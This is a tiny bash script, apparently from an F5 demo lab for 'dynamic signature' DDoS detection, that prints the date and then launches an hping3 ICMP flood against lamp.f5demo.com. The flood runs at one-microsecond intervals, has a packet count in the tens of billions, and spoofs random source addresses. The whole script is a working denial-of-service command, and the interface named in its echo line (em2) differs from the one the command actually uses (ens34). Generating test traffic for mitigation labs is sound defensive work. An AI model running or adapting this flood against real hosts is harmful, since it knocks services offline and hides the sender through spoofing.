#!/bin/bash
date
echo "Starting Flood (Dynamic Signature Example): hping3 -1 -c 100000000000 -i u1 --tos 21 --ttl 33 -I em2 -m 678 -d 99 --rand-source lamp.f5demo.com"
hping3 -1 -c 100000000000 -i u1 --tos 21 --ttl 33 -I ens34 -m 678 -d 99 --rand-source lamp.f5demo.com
